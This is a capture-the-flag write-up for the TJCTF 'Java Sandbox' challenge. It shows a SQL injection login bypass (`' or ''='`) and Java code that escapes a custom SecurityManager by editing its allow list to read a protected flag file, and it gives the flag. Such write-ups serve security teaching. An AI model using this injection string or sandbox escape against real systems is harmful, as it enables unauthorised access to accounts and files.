# Java Sandbox (100 pts)

---

## Problem
Everyone's heard of python jail escapes, but what about Java? [Java Sandbox](http://javasandbox.p.tjctf.org/)

---

## Solution
At first, we are presented with a login portal. We try a random username and password, and a message in the corner appears to try MySQL injection.

We then login successfully with the username `' or ''='` and password `' or ''='`

At this point we reach a page where we can type, then submit a java program to compile and run it. In the security page, we are told that the flag resides at `/var/www/flag.txt`. We created a small java program to attempt to read this flag:

```java
import java.io.BufferedReader;
import java.io.FileReader;

public class Main {
    public static void main(String[] args) throws Exception {
        BufferedReader read = new BufferedReader(new FileReader("/var/www/flag.txt"));
        System.out.println(read.readLine());
    }
}
```

However, when we submit this program, we get an error message saying that access was denied by the security manager, and we don't have permissions to read it.

We then see that source for the custom security manager and the program wrapper is available on the security page as well:

```java
import java.lang.reflect.Method;
import java.security.Permission;
import java.util.ArrayList;
import java.util.Arrays;
class CustomSecurityManager extends SecurityManager {
    ArrayList<String> allow;
    String insecureClassName;
    String[] allowedLibraries = new String[] {"com.google","twitter4j","com.securefiledownloader"};
    public CustomSecurityManager(String className, String[] allowed) {
        insecureClassName = className;
        allow = new ArrayList<String>(Arrays.asList(allowed));
        // allow standard jre libraries
        allow.add(System.getProperty("java.home"));
    }

    public boolean checkAllow(String str) {
        for (String i : allow) {
            if (str.startsWith(i))
                return true;
        }
        return false;
    }

    public boolean isLibrary() {
        StackTraceElement[] stack = Thread.currentThread().getStackTrace();
        for (StackTraceElement s : stack) {
            // reached end
            if ((""+s).startsWith("Wrapper") || (""+s).startsWith(insecureClassName)) {
                return false;
            }
            // pass cases that obviously aren't libraries
            if ((""+s).startsWith("CustomSecurityManager") || (""+s).startsWith("java.") || (""+s).startsWith("sun.")) {
                continue;
            }
            for (String x : allowedLibraries) {
                if ((""+s).startsWith(x)) {
                    return true;
                }
            }
        }
        return false;
    }

    @Override
    public void checkPermission(Permission perm) {
        if (perm instanceof java.io.FilePermission) {
            if (!perm.getActions().equals("read")) {
                throw new SecurityException(""+perm);
            }
            // allow trusted libraries to access files
            if (!isLibrary()) {
                if (!checkAllow(perm.getName())) {
                    throw new SecurityException("File access denied! "+perm);
                }
            }
        }
        else if (perm instanceof java.net.SocketPermission || perm instanceof java.net.NetPermission || perm instanceof javax.net.ssl.SSLPermission) {
            // allow trusted libraries to access the internet
            if (!isLibrary()) {
                // need this to create URLs
                if (!perm.getName().equals("specifyStreamHandler")) {
                    throw new SecurityException("Socket access denied! "+perm);
                }
            }
        }
        else if (perm instanceof java.lang.RuntimePermission) {
            if (perm.getName().equals("setSecurityManager") || perm.getName().equals("createSecurityManager")) {
                throw new SecurityException("Nope! "+perm);
            }
            if (perm.getName().equals("createClassLoader") || perm.getName().equals("preferences")) {
                throw new SecurityException("Nah... "+perm);
            }
            if (perm.getName().equals("queuePrintJob")) {
                throw new SecurityException("Why... "+perm);
            }
        }
        else if (perm instanceof java.security.SecurityPermission) {
            throw new SecurityException("Permission denied! "+perm);
        }
        else if (perm instanceof java.sql.SQLPermission || perm instanceof java.util.logging.LoggingPermission || perm instanceof java.awt.AWTPermission) {
            // just in case...
            throw new SecurityException("Permission denied! "+perm);
        }
        // i think thats everything
    }
}

import java.lang.reflect.Method;
public class Wrapper {
    public static void main(String[] args) {
        args[0] = "Main";
        // args[0] is the name of the class to run
        // args[1] is a colon separated list of directories your program can access
        System.setSecurityManager(new CustomSecurityManager(args[0], args[1].split(":")));
        try {
            Class<?> unsafeClass = ClassLoader.getSystemClassLoader().loadClass(args[0]);
            Method m = unsafeClass.getMethod("main", String[].class);
            m.invoke(null, new Object[] {new String[] {}});
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

Upon analysing this, we see that access to the file is restricted because its path is not in the `allow` list.

From the wrapper class, we see that CustomSecurityManager is in the same namespace as where "Main" (the uploaded class) is located. This means we can reference the CustomSecurityManager directly.

We then run the following code and successfully read the flag:
```java
import java.io.BufferedReader;
import java.io.FileReader;
import java.util.List;
public class Main {
    public static void main(String[] args) throws Exception {
        CustomSecurityManager csm = (CustomSecurityManager)System.getSecurityManager(); //get instance of the CustomSecurityManager class
        System.out.println(csm.allow);
        List<String> allow = csm.allow; //add to the allow list
        allow.add("/var/www/flag.txt");
        System.out.println(allow);
        BufferedReader read = new BufferedReader(new FileReader("/var/www/flag.txt"));
        System.out.println(read.readLine());
    }
}
```

---

## Flag
`tjctf{j4V4_R3FL3C710n_15_7R1CkY}`